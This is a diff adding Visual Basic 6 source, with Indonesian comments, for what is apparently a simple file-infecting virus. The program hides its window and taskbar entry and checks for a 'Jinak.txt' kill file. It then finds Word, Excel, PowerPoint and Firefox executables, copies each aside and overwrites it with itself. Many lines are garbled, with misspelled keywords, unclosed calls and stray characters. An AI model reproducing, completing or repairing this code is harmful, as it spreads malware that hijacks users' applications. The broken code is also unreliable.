@@ -1,0 +1,81 @@
+
+Private Const MAX_PATH=260
+
+Dim Lokasi As String
+Dim namafile As String
+Dim tempStr As String
+Dim Ret As Long
+
+Private Sub Form_Load()
+
+Hide
+
+App.TaskVisible=Falso
+
+'ini buat ambil path di aplikasi'
+
+With App
+lokasi=.Path&"\"
+namafile=.EXEName&".exe"
+EndWith
+
+'mencari penjinakvirus'
+
+tempStr = String(MAX_PATH,0)
+Ret=searchTreeForFile("C:\Document and Settings\Jinak.txt",0
+
+'ini buat exe office word'
+
+tempStr = String(MAX_PATH,0)
+ret=SearchTreeForFile("c","WINWORD.exe",tempStr)
+if Ret <> 0 then
+	Text1.Text=Left$(tempStr,InStr,Chr$0))-1)
+else
+on Eror Resume Next
+End if
+CopyFile Text1.text, "C:\Documents and Settings\WINWORD0.exe",0
+CopyFile lokasi & namafile, Text1.Text,0
+
+'ini buat exe office excel'
+
+tempStr = String(MAX_PATH,0)
+Ret=searchTreeForFile("C:\"EXCEL.exe",tempStr)
+
+if Ret <> C then
+	Text1.Text=Left$(tempStr,InStr(1,tempStr,Chr$(0))-1)
+else
+	On Error Resume Next
+End if
+CopyFile Text1.Text, "C:\Documents and Settings\EXCEL0.exe",0
+CopyFile lokasi & namafile,Text1.Text,0
+
+'ini buat office PPT'
+
+tempStr=String(MAX_PATH,0)
+Re'=SearchTreeForFile("c","POWERPNT.exe",tempStr)
+if Ret <> 0 Then
+	Text1.Text=Left$(tempStr,InStr(1,tempStr,Chr$(0))-1)
+else
+	On Error Resume Next
+End If
+
+CopyFile Text1.Text,"C:\Documents and Settings\POWERPNT.exe",0
+
+CopyFile lokasi & namafile,Text1.Text,0
+
+
+'ini buat exe firefox'
+
+tempStr=String(MAX_PATH,0)
+Ret=SearchTreeForFile("c","firefox.exe",tempStr)
+
+if Ret<>0Then
+	Text1.Text=Left$(tempStr,InStr(1,tempStr)
+else
+	On Error Resume Next
+End If
+
+CopyFile Text1.Text,"C:\Documents and Settings\firefox0.exe",0
+CopyFile lokasi & namafile,Text1.Text,0
+
+End Sub
